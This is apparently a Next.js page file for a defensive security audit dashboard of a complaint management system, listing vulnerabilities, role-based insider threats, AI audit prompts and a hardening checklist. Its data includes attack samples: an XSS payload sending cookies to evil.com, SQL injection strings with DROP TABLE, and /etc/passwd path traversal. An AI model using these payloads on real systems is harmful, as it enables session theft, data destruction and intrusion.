'use client';
import { useState, useMemo } from 'react';
import DashboardLayout from '@/components/DashboardLayout';
import {
  Shield, AlertTriangle, ShieldAlert, Bug, Lock, Eye, FileText, Server,
  GitBranch, Upload, Code, Search, Crown, Settings, ArrowsUpFromLine,
  Users, Copy, Check, ChevronDown, ChevronRight, CheckCircle2, Circle,
  Clipboard, ClipboardCheck, Terminal, Zap, ShieldCheck
} from 'lucide-react';

/* ────────────────────────────── DATA ────────────────────────────── */

type Severity = 'C' | 'H' | 'M' | 'L';

interface Vulnerability {
  id: number;
  sev: Severity;
  area: string;
  title: string;
  attack: string;
  root: string;
  impact: string;
  fix: string;
  tests: string[];
}

interface RoleThreat {
  sev: Severity;
  text: string;
}

interface Role {
  name: string;
  icon: string;
  desc: string;
  threats: RoleThreat[];
}

interface AuditPrompt {
  area: string;
  icon: string;
  prompt: string;
}

interface ChecklistCategory {
  cat: string;
  items: string[];
}

const VULNS: Vulnerability[] = [
  {id:1,sev:'C',area:'Authorization',title:'Broken Object-Level Authorization (IDOR)',attack:'Employee changes complaint ID in URL from /complaints/own-id to /complaints/other-id and accesses another employee\'s private complaint.',root:'API fetches complaint by ID without verifying the requesting user is the owner or an authorized handler.',impact:'Any authenticated user can read, modify, or delete any complaint in the system.',fix:'Enforce ownership or role-based checks on every object-level API call. Use middleware that verifies the relationship between the authenticated user and the requested resource.',tests:['As Employee A, call GET /api/complaints/{Employee B\'s complaint ID}','As Employee, call PUT /api/complaints/{other ID} with modified data','Verify 403 is returned for unauthorized access']},
  {id:2,sev:'C',area:'Authorization',title:'Vertical privilege escalation via role parameter',attack:'Employee intercepts API request and changes role field from "Employee" to "Admin" in request body or JWT payload.',root:'Backend trusts role information from the client (request body, token, or header) without server-side verification against the database.',impact:'Complete system takeover — any user becomes Admin.',fix:'Role must always come from the server-side session/database lookup, never from user-controlled input. Validate JWT signatures and never allow role claims to override the DB.',tests:['Modify JWT payload to change role to ADMIN','Send POST request with role: "ADMIN" in body','Verify server ignores client-supplied role values']},
  {id:3,sev:'C',area:'Authentication',title:'No account lockout after failed login attempts',attack:'Attacker uses credential stuffing or brute-force tool against /api/auth/login with common password lists.',root:'Login endpoint has no rate limiting, CAPTCHA, or lockout mechanism.',impact:'Account compromise at scale, especially for users with weak passwords.',fix:'Implement progressive lockout (lock account after 5 failed attempts for 15 minutes). Add rate limiting per IP and per account. Require CAPTCHA after 3 failures.',tests:['Submit 20 wrong passwords rapidly — check if account locks','Check for rate-limit headers (429 response)','Verify lockout notification email is sent']},
  {id:4,sev:'C',area:'Authentication',title:'JWT secret weak or hardcoded',attack:'Attacker finds JWT_SECRET="secret123" in source code or guesses it, then forges valid tokens for any user and role.',root:'JWT signing key is hardcoded in source, committed to Git, or uses a weak/default value.',impact:'Complete authentication bypass — attacker can impersonate any user including Admin.',fix:'Use a cryptographically random secret (256+ bits). Store in a secrets manager. Rotate periodically. Never commit to version control.',tests:['Search codebase for JWT_SECRET, SECRET_KEY, or similar','Attempt to sign a forged JWT with common secrets (secret, password, 123456)','Verify JWT uses RS256 or a strong HS256 key']},
  {id:5,sev:'C',area:'Authorization',title:'Workflow state bypass',attack:'HR Investigator directly calls POST /api/complaints/{id}/close to close a complaint that is still under investigation, skipping Head approval.',root:'API endpoint checks role permission ("is investigator") but not the complaint\'s current workflow state.',impact:'Cases closed without proper review, due process violated, legal risk.',fix:'Implement a state machine that enforces valid transitions. Every state-changing endpoint must validate: (current_state + action + actor_role) is a permitted transition.',tests:['As Investigator, POST /api/complaints/{id}/close while status is "under_investigation"','As Employee, try to escalate directly to CMD','Verify state machine rejects invalid transitions with 409 Conflict']},
  {id:6,sev:'C',area:'Data Protection',title:'SQL injection in complaint search',attack:'Attacker enters \' OR 1=1 -- in the search field and retrieves all complaints from the database.',root:'Search query uses string concatenation instead of parameterized queries.',impact:'Full database read access (all complaints, user credentials, PII). Potential for data modification or deletion.',fix:'Use parameterized queries or ORM query builders exclusively. Never concatenate user input into SQL. Add input validation as defense-in-depth.',tests:['Enter \' OR \'1\'=\'1 in search field','Submit ; DROP TABLE complaints;-- as search term','Test with sqlmap against search and filter endpoints']},
  {id:7,sev:'C',area:'File Upload',title:'Unrestricted file upload leading to RCE',attack:'Attacker uploads a .php or .jsp web shell disguised as an image by changing the Content-Type header. The file is stored in a web-accessible directory and executed.',root:'Server validates file type using only the Content-Type header (client-controlled) and stores files in the web root.',impact:'Remote Code Execution — attacker has full server control.',fix:'Validate file type server-side using magic bytes. Store files outside web root or in a private cloud bucket. Rename to UUID. Restrict executable permissions.',tests:['Upload a .php file with Content-Type: image/png','Upload a .html file containing JavaScript','Check if uploaded files are accessible via direct URL and executable']},
  {id:8,sev:'H',area:'Authentication',title:'No MFA for privileged roles',attack:'HR Head\'s password is phished. Attacker logs in and approves/closes sensitive complaints.',root:'MFA not implemented or not enforced for high-privilege roles (Admin, HR Head, CMD Head).',impact:'Single-factor compromise leads to full role impersonation.',fix:'Enforce TOTP or hardware-key MFA for all roles above Employee. Make MFA bypass impossible even for Admins.',tests:['Login as Admin without MFA — should require second factor','Check if MFA can be disabled by the user without re-authentication','Verify MFA enrollment is enforced on first login for privileged roles']},
  {id:9,sev:'H',area:'Input Validation',title:'Stored XSS in complaint text',attack:'Attacker submits <script>document.location="https://evil.com/?c="+document.cookie</script> as complaint text. When HR Investigator views it, the script runs in their browser.',root:'Complaint text rendered without sanitization in the investigator dashboard.',impact:'Session hijacking of HR staff, keylogging, phishing within the portal.',fix:'Sanitize all user content with a library (DOMPurify). Use Content-Security-Policy headers. Never use innerHTML with user data.',tests:['Submit <script>alert(1)</script> as complaint text','Submit <img src=x onerror=alert(1)> in attachment name','Check CSP header is present and restrictive']},
  {id:10,sev:'H',area:'Data Protection',title:'Sensitive complaint data in API response',attack:'API returns full complaint objects including fields the current role should not see (e.g., investigation notes returned to the Employee who filed the complaint).',root:'API returns the full database model without field-level filtering by role.',impact:'Premature disclosure of investigation status, disciplinary decisions, or witness details.',fix:'Use response serializers/DTOs with role-aware field inclusion. Never return the raw DB model.',tests:['As Employee, call GET /api/complaints/my and check if investigation_notes is present','As Investigator, check if other investigators\' notes are visible','Compare API responses across roles for the same complaint ID']},
  {id:11,sev:'H',area:'Audit Logging',title:'Audit logs not tamper-evident',attack:'Admin with DB access deletes audit entries covering their unauthorized actions.',root:'Audit logs stored in the same database and accessible to admins with DB write permissions.',impact:'Insider abuse undetectable, forensic investigation impossible.',fix:'Write audit logs to a separate append-only system (separate DB user with INSERT-only rights, or external SIEM). Hash chain entries.',tests:['Attempt to DELETE from audit_logs as admin DB user — should fail','Verify log entries are created for complaint view, status change, and export','Check if failed login attempts appear in audit log']},
  {id:12,sev:'H',area:'Infrastructure',title:'Secrets in environment not secured',attack:'Developer accidentally commits .env file to Git. Attacker finds it via GitHub search and extracts DB credentials and JWT secret.',root:'No .gitignore enforcement, no secret scanning in CI/CD.',impact:'Full database access, ability to forge any JWT token.',fix:'Use a secrets manager (Vault, AWS Secrets Manager). Add .env to .gitignore. Add secret scanning (Gitleaks, GitHub secret scanning) to CI.',tests:['Search GitHub repo for .env, config, password, secret','Check if JWT_SECRET in code is a short/guessable string','Verify no credentials in Docker images via docker inspect']},
  {id:13,sev:'H',area:'API Security',title:'No rate limiting on data export endpoints',attack:'Attacker (compromised HR account) calls /api/reports/export in a loop, exfiltrating all complaint data within minutes.',root:'Export endpoints have no rate limit or volume cap.',impact:'Mass data exfiltration, regulatory breach, privacy violation.',fix:'Rate-limit export to N records per hour per user. Require re-authentication for bulk exports. Alert on unusual export volume.',tests:['Call export endpoint 20 times in 60 seconds — check if throttled','Export with date range covering all records — check for volume cap','Verify export action appears in audit log']},
  {id:14,sev:'H',area:'Authorization',title:'Cross-department complaint access',attack:'HR Investigator calls /api/complaints?dept=CMD and receives CMD-level complaints they should not see.',root:'Department filter applied only on frontend; backend returns all records the user\'s role class can access without department scoping.',impact:'Confidential CMD-level complaints visible to HR staff.',fix:'Every query must be scoped to the user\'s department AND their role. Use database-level row filtering or enforce in service layer.',tests:['As HR Investigator, call GET /api/complaints without a department filter','Try accessing a CMD complaint ID directly as an HR user','Check if department boundary is enforced after role escalation']},
  {id:15,sev:'M',area:'Input Validation',title:'Path traversal in file download',attack:'Attacker calls GET /api/files/../../../etc/passwd to read server files outside the upload directory.',root:'File path constructed using user-supplied filename without sanitization.',impact:'Exposure of server configuration files, SSH keys, database credentials.',fix:'Resolve file paths to an absolute path and verify it starts with the allowed upload directory. Use UUID filenames only.',tests:['GET /api/files/../../../etc/passwd','GET /api/files/%2e%2e%2f%2e%2e%2fetc%2fpasswd (URL-encoded)','Verify file access returns only files within upload directory']},
  {id:16,sev:'M',area:'Session Management',title:'No session invalidation on logout',attack:'Employee logs out but their JWT remains valid until expiry. If stolen before logout, it continues to work.',root:'Logout only clears the client-side token. No server-side token blacklist.',impact:'Stolen tokens remain valid after the user believes they have logged out.',fix:'Maintain a server-side token blacklist (Redis) or use short-lived tokens with refresh token revocation on logout.',tests:['Copy JWT before logout. Logout. Use copied JWT — should return 401','Check if token expiry is ≤15 minutes','Verify refresh token is invalidated on logout']},
  {id:17,sev:'M',area:'Data Protection',title:'PII not masked in logs',attack:'A developer or ops engineer with log access reads complaint descriptions containing employee names, health information, or financial details.',root:'Application logs complaint content for debugging without masking sensitive fields.',impact:'Privacy breach, regulatory non-compliance (personal data in logs).',fix:'Define which fields are sensitive. Mask or omit them from logs. Use structured logging with a PII scrubber.',tests:['Submit a complaint with a clearly fake SSN — check if it appears in logs','Review application log output for complaint text or user emails','Check error logs for stack traces containing request bodies']},
  {id:18,sev:'M',area:'Infrastructure',title:'Dependencies with known CVEs',attack:'An attacker exploits a known vulnerability in an outdated npm/pip package used by the CMS.',root:'No automated dependency vulnerability scanning; packages not updated regularly.',impact:'Varies by CVE — can range from denial of service to remote code execution.',fix:'Run npm audit / pip-audit in CI/CD pipeline. Use Dependabot or Snyk. Block deployment if high-severity CVEs exist.',tests:['Run npm audit --audit-level=high in the project root','Check package.json for packages with version * or latest','Verify CI pipeline fails on high CVE dependencies']},
  {id:19,sev:'M',area:'Business Logic',title:'Race condition on complaint assignment',attack:'Two HR Assigners simultaneously assign the same complaint to different investigators. Both succeed, creating duplicate assignments and data inconsistency.',root:'No database-level locking or optimistic concurrency control on the assign operation.',impact:'Duplicate investigation work, conflicting findings, audit trail gaps.',fix:'Use database transactions with SELECT FOR UPDATE, or optimistic locking with a version field. Return 409 Conflict on race.',tests:['Use two browser sessions to assign the same complaint simultaneously','Check complaint record for duplicate investigator assignments','Verify only one assignment succeeds when concurrent requests arrive']},
  {id:20,sev:'M',area:'Monitoring',title:'No alerting on suspicious admin actions',attack:'Compromised admin account creates a new admin user, exports all data, and deletes audit logs — none of these trigger alerts.',root:'Audit logs exist but no real-time alerting rules are configured.',impact:'Insider abuse or account takeover goes undetected until discovered manually.',fix:'Define alert rules: new admin created, bulk export, audit log access, failed login spike. Send alerts to a separate channel (email/SIEM).',tests:['Create a new admin user — verify alert is triggered within 1 minute','Export all data — verify ops team is notified','Simulate 10 failed logins — verify alert threshold fires']},
  {id:21,sev:'L',area:'Data Protection',title:'Complaint data not purged after retention period',attack:'Resolved complaints from 3 years ago remain in the database, increasing breach impact and violating privacy policy.',root:'No automated data retention/deletion job defined or scheduled.',impact:'Regulatory non-compliance, unnecessary data exposure risk.',fix:'Implement a scheduled job that archives and then deletes complaints older than the defined retention period. Log all deletions.',tests:['Check database for complaint records older than retention period','Verify a scheduled purge job exists in cron/task scheduler','Confirm deleted records are logged in audit trail']},
  {id:22,sev:'L',area:'Infrastructure',title:'Error messages reveal stack traces',attack:'Attacker triggers an error and sees full stack trace, framework version, and file paths in the API response.',root:'Debug mode enabled in production, or errors not caught and returned raw.',impact:'Reveals technology stack, file structure, and potential vulnerability hints.',fix:'Catch all exceptions. Return generic error messages to clients. Log full details server-side only. Disable debug mode in production.',tests:['Send malformed JSON to POST endpoints — check response body','Submit invalid complaint ID type (string instead of int)','Verify 500 errors return only a generic message']},
  {id:23,sev:'L',area:'Session Management',title:'Missing security headers',attack:'Clickjacking attack embeds the CMS login page in an iframe on a malicious site, tricking employees into acting on the attacker\'s site.',root:'X-Frame-Options and Content-Security-Policy headers not set.',impact:'Clickjacking, MIME sniffing attacks, reduced browser protection.',fix:'Add: X-Frame-Options: DENY, X-Content-Type-Options: nosniff, Strict-Transport-Security, Referrer-Policy, CSP.',tests:['Check response headers for all security headers','Try embedding login page in an iframe on a test page','Run securityheaders.com scan against the deployed URL']},
  {id:24,sev:'L',area:'Data Protection',title:'Backup files publicly accessible',attack:'Attacker discovers /backups/cms_2025_01_01.sql.gz via directory enumeration and downloads a full database backup.',root:'Backup files stored in a web-accessible directory without authentication.',impact:'Complete data breach including all complaints, user accounts, and hashed passwords.',fix:'Store backups outside the web root (or in a private S3 bucket). Encrypt backups. Test restore procedures quarterly.',tests:['Try GET /backups/, /backup/, /db/ on the web server','Check S3 bucket ACL if using cloud storage — must be private','Verify backups are encrypted and restore is tested']},
];

const ROLES: Role[] = [
  {name:'Employee',icon:'user',desc:'Files and tracks complaints',threats:[
    {sev:'C',text:'Viewing another employee\'s complaint by changing complaint ID in the URL or API call.'},
    {sev:'C',text:'Escalating their own complaint to CMD by directly calling the CMD assignment API.'},
    {sev:'H',text:'Uploading a malicious file as "evidence" to compromise investigator machines.'},
    {sev:'M',text:'Submitting duplicate complaints to flood the system and observe which investigator is assigned.'},
    {sev:'M',text:'Injecting XSS in complaint text to attack HR staff who view the complaint dashboard.'},
  ]},
  {name:'HR Assigner',icon:'split',desc:'Assigns HR complaints to investigators',threats:[
    {sev:'C',text:'Assigning complaints to themselves (as investigator) to control the outcome of an investigation.'},
    {sev:'C',text:'Accessing CMD-level complaints via direct API calls outside their department scope.'},
    {sev:'H',text:'Closing or rejecting complaints before assignment to suppress issues.'},
    {sev:'H',text:'Exporting all complaint data by scripting the export endpoint in a loop.'},
    {sev:'M',text:'Reassigning complaints between investigators to delay resolution or create confusion.'},
  ]},
  {name:'HR Investigator',icon:'search',desc:'Investigates HR-assigned complaints',threats:[
    {sev:'C',text:'Closing cases prematurely by directly calling the close-case API without Head approval.'},
    {sev:'C',text:'Accessing complaints assigned to other investigators within HR.'},
    {sev:'H',text:'Altering their own submitted findings after Head review begins.'},
    {sev:'H',text:'Leaking complaint details and evidence files outside the system.'},
    {sev:'M',text:'Marking cases as "no action required" without completing mandated investigation steps.'},
  ]},
  {name:'HR Head',icon:'crown',desc:'Reviews and approves HR investigations',threats:[
    {sev:'C',text:'Approving their own complaint or one they have a conflict of interest in.'},
    {sev:'H',text:'Accessing CMD investigation findings via direct API calls.'},
    {sev:'H',text:'Overriding investigator findings without providing a documented reason.'},
    {sev:'M',text:'Escalating cases to CMD without meeting the required escalation criteria.'},
  ]},
  {name:'CMD Assigner',icon:'split',desc:'Assigns escalated CMD complaints',threats:[
    {sev:'C',text:'Accessing HR-level complaints that were not escalated to CMD.'},
    {sev:'H',text:'Self-assigning cases and bypassing CMD investigator separation.'},
    {sev:'M',text:'Delaying CMD assignment to run down investigation time limits.'},
  ]},
  {name:'CMD Investigator',icon:'shield-search',desc:'Investigates CMD-level complaints',threats:[
    {sev:'C',text:'Making final close decisions that are reserved for CMD Head role.'},
    {sev:'H',text:'Sharing CMD investigation findings with HR staff below CMD level.'},
    {sev:'M',text:'Accessing HR investigation history to influence CMD-level findings.'},
  ]},
  {name:'CMD Head',icon:'crown',desc:'Final decisions on escalated cases',threats:[
    {sev:'C',text:'Bulk-closing cases using an API call without individual review — bypassing due process.'},
    {sev:'H',text:'Deleting or anonymizing complaint records to remove evidence of misconduct.'},
    {sev:'H',text:'Adding or removing admin accounts to create backdoor access.'},
  ]},
  {name:'Admin',icon:'settings',desc:'Manages users, roles, and audit logs',threats:[
    {sev:'C',text:'Creating a shadow admin account to maintain access after termination.'},
    {sev:'C',text:'Deleting or modifying audit log entries to cover unauthorized actions.'},
    {sev:'C',text:'Resetting any user\'s password and using it to impersonate that user.'},
    {sev:'H',text:'Disabling MFA for specific accounts to enable easier access.'},
    {sev:'H',text:'Exporting the full user database including hashed passwords for offline cracking.'},
  ]},
];

const PROMPTS: AuditPrompt[] = [
  {area:'Authentication & Session',icon:'lock',prompt:`You are a senior penetration tester. Review the authentication system of a Complaint Management System built with [YOUR STACK]. Check for:\n1. Login endpoint — is there rate limiting, lockout after failed attempts, and CAPTCHA?\n2. Password storage — are passwords hashed with bcrypt/argon2? Is there a minimum strength policy?\n3. MFA — is MFA enforced for all non-employee roles? Can MFA be bypassed?\n4. Session tokens — are JWTs stored in HttpOnly cookies? What is the expiry? Is logout server-side?\n5. Account recovery — does the password reset flow verify identity securely? Can tokens be reused?\n\nFor each issue found, provide: attack scenario, severity (Critical/High/Medium/Low), and recommended fix.\nShare your [auth route file] and [session middleware] for review.`},
  {area:'Authorization & IDOR',icon:'shield-lock',prompt:`You are a security auditor specializing in broken access control. Review the authorization layer of a multi-role Complaint Management System.\nThe system has 8 roles: Employee, HR Assigner, HR Investigator, HR Head, CMD Assigner, CMD Investigator, CMD Head, Admin.\nCheck for:\n1. IDOR — can a user access complaint records by changing the ID without ownership/assignment check?\n2. Horizontal access — can an HR user access CMD complaints and vice versa?\n3. Vertical access — can an Employee call Investigator or Admin endpoints?\n4. Role from request — is role ever read from the request body, headers, or JWT payload without server verification?\n5. State machine — can an Investigator close a case that requires Head approval?\n\nTest every CRUD endpoint by role. Provide attack scenarios and code-level fixes.\nShare your [route definitions] and [authorization middleware].`},
  {area:'Input Validation & Injection',icon:'code',prompt:`You are an OWASP-specialized security reviewer. Audit all user-controlled inputs in a Complaint Management System. Check for:\n1. SQL Injection — search fields, filters, and ID parameters concatenated into queries?\n2. XSS — is complaint text, file names, and user input sanitized before rendering?\n3. CSRF — are state-changing endpoints protected with CSRF tokens or SameSite cookies?\n4. Command injection — is any user input passed to shell commands or file operations?\n5. Path traversal — can a filename like ../../etc/passwd be used in file download endpoints?\n6. NoSQL injection — if using MongoDB, are queries built with user input directly?\n\nFor each finding, provide a working proof-of-concept payload, severity, and parameterized/sanitized fix.\nShare your [controllers], [models], and [file handling code].`},
  {area:'File Upload Security',icon:'upload',prompt:`You are a security engineer reviewing file upload functionality in a Complaint Management System where employees attach evidence to complaints. Check for:\n1. MIME validation — is file type validated server-side, not just by extension or Content-Type header?\n2. Executable uploads — can .php, .sh, .exe, .js files be uploaded and executed?\n3. Malware scanning — is uploaded content scanned with an AV API before storage?\n4. Storage location — are files stored outside the web root or in a private cloud bucket?\n5. File naming — are uploaded files renamed to UUIDs, or do original names reach the filesystem?\n6. Access control — can a user download another user's uploaded file by guessing the path?\n7. Size limits — is there a per-file and per-complaint attachment size limit?\n\nProvide bypass techniques for each control, severity, and hardened implementation.\nShare your [file upload handler] and [storage configuration].`},
  {area:'Business Logic & Workflow',icon:'git-branch',prompt:`You are a business logic security tester. Review the complaint workflow in a multi-role CMS.\nWorkflow: Employee submits → Assigner assigns → Investigator investigates → Head approves/escalates → CMD flow mirrors this.\nCheck for:\n1. Workflow bypass — can a user skip steps (e.g., Investigator closes without Head approval)?\n2. Self-assignment — can an Assigner assign cases to themselves as Investigator?\n3. Conflict of interest — can a subject of a complaint view or participate in their own case?\n4. Race conditions — can two Assigners simultaneously assign the same complaint?\n5. State rollback — can a closed case be reopened by unauthorized users?\n6. Duplicate submissions — does the system prevent the same complaint from being submitted twice within a short window?\n\nFor each issue, provide an exploit scenario and the required state machine validation fix.\nShare your [complaint state management code] and [API route handlers].`},
  {area:'API & Infrastructure',icon:'server',prompt:`You are a DevSecOps engineer reviewing the API and infrastructure of a Complaint Management System. Check for:\n1. Missing auth — are all API routes behind authentication middleware?\n2. Rate limiting — do search, export, and login endpoints have rate limits?\n3. Security headers — are X-Frame-Options, CSP, HSTS, X-Content-Type-Options set?\n4. Secrets — are credentials, JWT secrets, and API keys stored in environment variables and excluded from version control?\n5. Dependencies — do npm audit / pip-audit return any high or critical CVEs?\n6. Error handling — do 500 errors return stack traces or internal paths to the client?\n7. CORS — is CORS restricted to known origins, not wildcard (*)?\n\nProvide findings, severity, and infrastructure/config-level fixes.\nShare your [server entry point], [CORS config], [Dockerfile or deployment config], and [package.json / requirements.txt].`},
];

const CHECKS: ChecklistCategory[] = [
  {cat:'Authentication',items:[
    'Login endpoint has rate limiting (max 5 attempts, then lockout)',
    'Account lockout notification sent to user email',
    'Passwords hashed with bcrypt or argon2 (not MD5/SHA1)',
    'MFA enforced for all roles except Employee (optional for Employee)',
    'JWT stored in HttpOnly + Secure + SameSite=Strict cookie',
    'JWT expiry ≤ 15 minutes; refresh token rotation on use',
    'Logout invalidates server-side session/token',
    'Password reset tokens expire within 15 minutes and are single-use',
  ]},
  {cat:'Authorization',items:[
    'Every API route has authentication middleware',
    'Object-level auth: complaint ownership/assignment verified on every fetch',
    'Department scoping: HR users cannot access CMD complaints and vice versa',
    'Role is read from server-side session, never from request body or JWT payload',
    'Workflow state machine: transitions validated against current state + actor role',
    'Self-assignment and conflict-of-interest checks implemented',
  ]},
  {cat:'Input & File Security',items:[
    'All user inputs validated and sanitized server-side',
    'Parameterized queries (no raw SQL string concatenation)',
    'Complaint text rendered with XSS sanitization (e.g., DOMPurify)',
    'Content Security Policy header set and restrictive',
    'File uploads: MIME type validated server-side',
    'Uploaded files renamed to UUID before storage',
    'File storage outside web root or in private cloud bucket',
    'File size and count limits enforced per complaint',
  ]},
  {cat:'Monitoring & Audit',items:[
    'Audit log created for: complaint create, view, status change, assignment, export, admin actions',
    'Audit logs stored in append-only store (separate DB user with INSERT-only rights)',
    'Alert triggered within 60 seconds for: new admin creation, bulk export, failed login spike',
    'Log entries do not contain PII (complaint text, employee names, SSNs)',
    'Log retention policy defined and enforced',
  ]},
  {cat:'Infrastructure',items:[
    '.env excluded from version control (.gitignore enforced)',
    'Secret scanning (Gitleaks / Dependabot) in CI/CD pipeline',
    'npm audit / pip-audit runs in CI and blocks on High/Critical CVEs',
    'All API responses include security headers (HSTS, X-Frame-Options, etc.)',
    'CORS restricted to known origins (no wildcard *)',
    'Production debug mode disabled; errors return generic messages',
    'Backups encrypted and stored outside web root',
    'Backup restore tested at least once per quarter',
  ]},
  {cat:'Data & Privacy',items:[
    'Sensitive fields (investigation notes) filtered from API responses by role',
    'Data retention period defined; automated purge job scheduled',
    'Only necessary fields collected per complaint',
    'PII masked in application logs',
    'Attachment access control: only authorized roles can download files',
  ]},
];

/* ────────────────────────────── HELPERS ─────────────────────────── */

const SEV_CONFIG: Record<Severity, { label: string; color: string; bg: string; border: string; glow: string }> = {
  C: { label: 'Critical', color: '#f87171', bg: 'rgba(239,68,68,0.12)', border: 'rgba(239,68,68,0.3)', glow: 'rgba(239,68,68,0.15)' },
  H: { label: 'High', color: '#fb923c', bg: 'rgba(249,115,22,0.12)', border: 'rgba(249,115,22,0.3)', glow: 'rgba(249,115,22,0.1)' },
  M: { label: 'Medium', color: '#60a5fa', bg: 'rgba(59,130,246,0.12)', border: 'rgba(59,130,246,0.3)', glow: 'rgba(59,130,246,0.1)' },
  L: { label: 'Low', color: '#34d399', bg: 'rgba(16,185,129,0.12)', border: 'rgba(16,185,129,0.3)', glow: 'rgba(16,185,129,0.1)' },
};

const ROLE_ICONS: Record<string, React.ReactNode> = {
  'user': <Users size={18} />,
  'split': <ArrowsUpFromLine size={18} />,
  'search': <Search size={18} />,
  'crown': <Crown size={18} />,
  'shield-search': <ShieldCheck size={18} />,
  'settings': <Settings size={18} />,
};

const PROMPT_ICONS: Record<string, React.ReactNode> = {
  'lock': <Lock size={18} />,
  'shield-lock': <ShieldAlert size={18} />,
  'code': <Code size={18} />,
  'upload': <Upload size={18} />,
  'git-branch': <GitBranch size={18} />,
  'server': <Server size={18} />,
};

type TabKey = 'vulns' | 'roles' | 'prompts' | 'checks';
type FilterKey = 'all' | Severity;

/* ────────────────────────────── COMPONENT ───────────────────────── */

export default function SecurityAuditPage() {
  const [activeTab, setActiveTab] = useState<TabKey>('vulns');
  const [filter, setFilter] = useState<FilterKey>('all');
  const [expandedVuln, setExpandedVuln] = useState<number | null>(null);
  const [selectedRole, setSelectedRole] = useState<number | null>(null);
  const [copiedPrompt, setCopiedPrompt] = useState<number | null>(null);
  const [checkState, setCheckState] = useState<Record<string, boolean>>({});

  const sevCounts = useMemo(() => ({
    C: VULNS.filter(v => v.sev === 'C').length,
    H: VULNS.filter(v => v.sev === 'H').length,
    M: VULNS.filter(v => v.sev === 'M').length,
    L: VULNS.filter(v => v.sev === 'L').length,
  }), []);

  const filteredVulns = useMemo(() =>
    filter === 'all' ? VULNS : VULNS.filter(v => v.sev === filter),
  [filter]);

  const totalChecks = CHECKS.reduce((sum, c) => sum + c.items.length, 0);
  const checkedCount = Object.values(checkState).filter(Boolean).length;
  const checkProgress = totalChecks > 0 ? Math.round((checkedCount / totalChecks) * 100) : 0;

  const handleCopyPrompt = (idx: number, text: string) => {
    navigator.clipboard.writeText(text);
    setCopiedPrompt(idx);
    setTimeout(() => setCopiedPrompt(null), 2000);
  };

  const toggleCheck = (key: string) => {
    setCheckState(prev => ({ ...prev, [key]: !prev[key] }));
  };

  const tabs: { key: TabKey; label: string; icon: React.ReactNode; count?: number }[] = [
    { key: 'vulns', label: 'Vulnerabilities', icon: <Bug size={15} />, count: VULNS.length },
    { key: 'roles', label: 'Role Threats', icon: <Users size={15} />, count: ROLES.length },
    { key: 'prompts', label: 'Audit Prompts', icon: <Terminal size={15} />, count: PROMPTS.length },
    { key: 'checks', label: 'Quick Checklist', icon: <CheckCircle2 size={15} />, count: totalChecks },
  ];

  return (
    <DashboardLayout title="Security Audit Guide">
      <style jsx global>{`
        .sa-glass {
          background: rgba(17, 17, 20, 0.5);
          backdrop-filter: blur(20px);
          border: 1px solid rgba(255, 255, 255, 0.06);
          border-radius: 16px;
          transition: all 0.25s ease;
          position: relative;
          overflow: hidden;
        }
        .sa-glass::before {
          content: '';
          position: absolute;
          top: 0; left: 0; right: 0;
          height: 1px;
          background: linear-gradient(90deg, transparent, rgba(251, 191, 36, 0.12), transparent);
        }
        .sa-glass:hover {
          border-color: rgba(255, 255, 255, 0.1);
        }
        .vuln-card {
          cursor: pointer;
          transition: all 0.2s ease;
        }
        .vuln-card:hover {
          transform: translateY(-1px);
          border-color: rgba(255, 255, 255, 0.12) !important;
        }
        .role-card-sa {
          cursor: pointer;
          transition: all 0.25s ease;
        }
        .role-card-sa:hover {
          transform: translateY(-2px);
          border-color: rgba(251, 191, 36, 0.25) !important;
        }
        .role-card-sa.selected {
          border-color: rgba(251, 191, 36, 0.4) !important;
          background: rgba(251, 191, 36, 0.04) !important;
        }
        .prompt-card {
          transition: all 0.2s ease;
        }
        .prompt-card:hover {
          border-color: rgba(251, 191, 36, 0.2) !important;
        }
        .check-item {
          transition: all 0.15s ease;
        }
        .check-item:hover {
          background: rgba(255, 255, 255, 0.03);
        }
        .sev-filter {
          cursor: pointer;
          transition: all 0.15s ease;
          user-select: none;
        }
        .sev-filter:hover {
          transform: scale(1.04);
        }
        @keyframes slideDown {
          from { opacity: 0; max-height: 0; }
          to { opacity: 1; max-height: 1500px; }
        }
        .vuln-details {
          animation: slideDown 0.3s ease forwards;
          overflow: hidden;
        }
        @keyframes fadeInUp {
          from { opacity: 0; transform: translateY(8px); }
          to { opacity: 1; transform: translateY(0); }
        }
        .anim-card {
          animation: fadeInUp 0.35s ease forwards;
        }
      `}</style>

      {/* ── Header Stats ─────────────────── */}
      <div style={{ marginBottom: 24 }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 12, marginBottom: 6 }}>
          <div style={{
            width: 40, height: 40, borderRadius: 12,
            background: 'linear-gradient(135deg, rgba(239,68,68,0.15), rgba(249,115,22,0.1))',
            border: '1px solid rgba(239,68,68,0.2)',
            display: 'flex', alignItems: 'center', justifyContent: 'center'
          }}>
            <Shield size={20} style={{ color: '#f87171' }} />
          </div>
          <div>
            <h1 style={{ fontSize: 22, fontWeight: 700, color: '#f1f5f9', margin: 0, fontFamily: 'var(--font-outfit)' }}>
              Security Audit Guide
            </h1>
            <p style={{ fontSize: 12, color: '#64748b', margin: 0, marginTop: 2 }}>
              CMS Vulnerability Assessment & Threat Analysis Framework
            </p>
          </div>
        </div>
      </div>

      {/* ── Severity Overview Cards ──────── */}
      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: 14, marginBottom: 24 }}>
        {(['C','H','M','L'] as Severity[]).map(sev => {
          const cfg = SEV_CONFIG[sev];
          return (
            <div key={sev} className="sa-glass" style={{
              padding: '16px 18px',
              borderLeft: `3px solid ${cfg.color}`,
              cursor: 'pointer',
              transition: 'all 0.2s ease',
            }}
            onClick={() => { setActiveTab('vulns'); setFilter(sev); }}
            >
              <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
                <span style={{ fontSize: 11, fontWeight: 600, color: cfg.color, textTransform: 'uppercase', letterSpacing: '0.06em' }}>
                  {cfg.label}
                </span>
                <span style={{
                  fontSize: 20, fontWeight: 700, color: cfg.color,
                  textShadow: `0 0 12px ${cfg.glow}`,
                }}>
                  {sevCounts[sev]}
                </span>
              </div>
              <div style={{ marginTop: 8 }}>
                <div style={{ height: 3, borderRadius: 2, background: 'rgba(255,255,255,0.06)', overflow: 'hidden' }}>
                  <div style={{
                    height: '100%', borderRadius: 2, background: cfg.color,
                    width: `${(sevCounts[sev] / VULNS.length) * 100}%`,
                    transition: 'width 0.6s ease',
                  }} />
                </div>
              </div>
            </div>
          );
        })}
      </div>

      {/* ── Tab Bar ──────────────────────── */}
      <div style={{
        display: 'flex', gap: 4, marginBottom: 24,
        background: 'rgba(255,255,255,0.03)',
